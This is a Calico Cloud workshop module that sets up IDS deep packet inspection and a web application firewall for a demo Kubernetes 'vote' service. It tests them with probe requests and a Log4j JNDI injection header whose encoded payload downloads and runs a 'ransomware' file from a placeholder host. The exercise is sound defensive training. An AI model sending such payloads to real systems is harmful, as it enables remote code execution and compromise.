# Module 5 - Configuring IDS protection and Workload-Centric WAF

Security teams need to run DPI quickly in response to unusual network traffic in clusters so they can identify potential threats. Also, it is critical to run DPI on select workloads (not all) to efficiently use cluster resources and minimize the impact of false positives. Calico Cloud provides an easy way to perform DPI using Snort community rules. You can disable DPI at any time, selectively configure for namespaces and endpoints, and alerts are generated in the `Alerts` dashboard in Manager UI.

For this workshop, we will enable the IDS for the vote service and observe the alerts being created when trying to exploit some vulnerabilities.

1. First enable the `Intrusion Detection`

   ```yaml
   kubectl apply -f - <<-EOF
   apiVersion: operator.tigera.io/v1
   kind: IntrusionDetection
   metadata:
     name: tigera-secure
   spec:
     componentResources:
     - componentName: DeepPacketInspection
       resourceRequirements:
         limits:
           cpu: "1"
           memory: 1Gi
         requests:
           cpu: 100m
           memory: 100Mi
   EOF
   ```

2. Next, create a `DeepPacketInspection` for the vote application in the vote namespace.

   ```yaml
   kubectl apply -f - <<-EOF
   apiVersion: projectcalico.org/v3
   kind: DeepPacketInspection
   metadata:
     name: dpi-ids-vote
     namespace: vote
   spec:
     selector: app == "vote"
   EOF
   ```

3. Test the IDS emulating an attack to the vote service:

   - Find the IP address of the vote application and export it to the `VOTE_EXTERNAL` environment variable

     ```bash
     export VOTE_EXTERNAL=$(kubectl get svc -n vote vote-external -o=jsonpath='{.status.loadBalancer.ingress[*].ip}')
     ```

   - From your shell, execute the following commands.

     ```bash
     curl -m2 http://$VOTE_EXTERNAL/cmd.exe
     curl -m2 http://$VOTE_EXTERNAL/NessusTest
     ```

   - Observe the results in the Service Graph to see the generated alerts that will warn you about the exploitation attempt.

---

A web application firewall (WAF) safeguards web applications against a range of application layer attacks, including cross-site scripting (XSS), SQL injection, and cookie poisoning. Given that application attacks are the primary cause of breaches, protecting the HTTP traffic that serves as a gateway to valuable application data is crucial.

Calico Cloud WAF allows you to selectively run service traffic within your cluster and protect intra-cluster traffic from common HTTP-layer attacks. To increase protection, you can use Calico Cloud network policies to enforce security controls on selected pods on the host.

1. Deploy the WAF by running the following command:

   ```bash
   kubectl apply -f waf
   ```

2. Open a new Cloud Shell session and start a pod to simulate an attack on the vote service.

   ```bash
   kubectl run attacker --image nicolaka/netshoot -it --rm -- /bin/bash
   ```
3. Before protecting the service with the WAF, try the following command from the attacker shell. This request will simulate a LOG4J attack.

   ```bash
   curl -v -H \
     'X-Api-Version: ${jndi:ldap://jndi-exploit.attack:1389/Basic/Command/Base64/d2dldCBldmlsZG9lci54eXovcmFuc29td2FyZTtjaG1vZCAreCAvcmFuc29td2FyZTsuL3JhbnNvbXdhcmU=}' \
     'vote.vote'
   ```

4. Now enable the WAF using the following command from your shell (not from the pod attacker).

   ```
   kubectl patch applicationlayer tigera-secure --type='merge' -p '{"spec":{"webApplicationFirewall":"Enabled"}}'
   ```

5. Go back to the attack pod, and repeat the request.

   ```bash
   curl -v -H \
     'X-Api-Version: ${jndi:ldap://jndi-exploit.attack:1389/Basic/Command/Base64/d2dldCBldmlsZG9lci54eXovcmFuc29td2FyZTtjaG1vZCAreCAvcmFuc29td2FyZTsuL3JhbnNvbXdhcmU=}' \
     'vote.vote'
   ```
   
   You will note that the result will be an HTTP 403 - Forbidden. This reponse returns from the WAF.

--- 

[:arrow_right: Module 6 - Detect Zero-Day Attacks with Threat Defence](/modules/module-6-threat-defence.md)  <br>

[:arrow_left: Module 4 - Security Guardrails for Network-based Threats](/modules/module-4-security-guardrails.md)  
[:leftwards_arrow_with_hook: Back to Main](/README.md)  
